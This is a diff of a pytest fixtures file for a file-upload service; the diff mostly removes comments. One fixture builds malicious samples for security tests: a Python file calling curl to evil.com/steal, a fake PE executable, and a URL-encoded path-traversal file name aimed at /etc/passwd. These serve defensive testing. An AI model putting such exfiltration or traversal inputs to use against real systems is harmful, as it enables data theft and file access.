@@ -11,14 +11,12 @@ from fastapi.testclient import TestClient
 from httpx import AsyncClient
 import asyncpg
 
-# Import the main application
 import sys
 sys.path.append(str(Path(__file__).parent.parent))
 
 from main import app
 from app.auth import AuthorizedUser
 
-# Test configuration
 TEST_DATABASE_URL = os.getenv("TEST_DATABASE_URL", "postgresql://localhost/archon_test")
 TEST_USER_ID = "test_user_123"
 TEST_USER_EMAIL = "test@example.com"
@@ -63,7 +61,6 @@ def sample_python_files(temp_directory: Path) -> dict:
     """Create sample Python files for testing."""
     files = {}
     
-    # Create a simple Python file
     main_py = temp_directory / "main.py"
     main_py.write_text("""
 #!/usr/bin/env python3
@@ -79,12 +76,10 @@ if __name__ == "__main__":
 """)
     files["main.py"] = main_py
     
-    # Create an __init__.py file
     init_py = temp_directory / "__init__.py"
     init_py.write_text("# Package initialization")
     files["__init__.py"] = init_py
     
-    # Create a requirements.txt file
     requirements_txt = temp_directory / "requirements.txt"
     requirements_txt.write_text("""
 fastapi==0.104.1
@@ -93,7 +88,6 @@ pytest==7.4.3
 """)
     files["requirements.txt"] = requirements_txt
     
-    # Create a setup.py file
     setup_py = temp_directory / "setup.py"
     setup_py.write_text("""
 from setuptools import setup, find_packages
@@ -117,7 +111,6 @@ def sample_malicious_files(temp_directory: Path) -> dict:
     """Create sample malicious files for security testing."""
     files = {}
     
-    # Create a file with suspicious content
     malicious_py = temp_directory / "malicious.py"
     malicious_py.write_text("""
 import os
@@ -129,12 +122,10 @@ subprocess.call(["curl", "http://evil.com/steal"], shell=True)
 """)
     files["malicious.py"] = malicious_py
     
-    # Create a file with dangerous extension
     exe_file = temp_directory / "virus.exe"
-    exe_file.write_bytes(b"MZ\x90\x00" + b"\x00" * 100)  # Fake PE header
+    exe_file.write_bytes(b"MZ\x90\x00" + b"\x00" * 100)
     files["virus.exe"] = exe_file
     
-    # Create a file with directory traversal
     traversal_file = temp_directory / "..%2f..%2fetc%2fpasswd"
     traversal_file.write_text("root:x:0:0:root:/root:/bin/bash")
     files["traversal"] = traversal_file
@@ -146,9 +137,8 @@ def large_files(temp_directory: Path) -> dict:
     """Create large files for size limit testing."""
     files = {}
     
-    # Create a file that's too large
     large_file = temp_directory / "large.py"
-    large_content = "# " + "x" * (60 * 1024 * 1024)  # 60MB file
+    large_content = "# " + "x" * (60 * 1024 * 1024)
     large_file.write_text(large_content)
     files["large.py"] = large_file
     
@@ -196,7 +186,6 @@ def mock_github_repos():
         }
     ]
 
-# Test utilities
 class TestFileUpload:
     """Utility class for creating test file uploads."""
     
@@ -226,7 +215,6 @@ class TestFileUpload:
         
         return form_data
 
-# Mock authentication for testing
 def override_get_current_user():
     """Override the authentication dependency for testing."""
     return AuthorizedUser(
@@ -236,7 +224,6 @@ def override_get_current_user():
         profile_image_url=None
     )
 
-# Test markers
 pytest.mark.unit = pytest.mark.unit
 pytest.mark.integration = pytest.mark.integration
 pytest.mark.security = pytest.mark.security
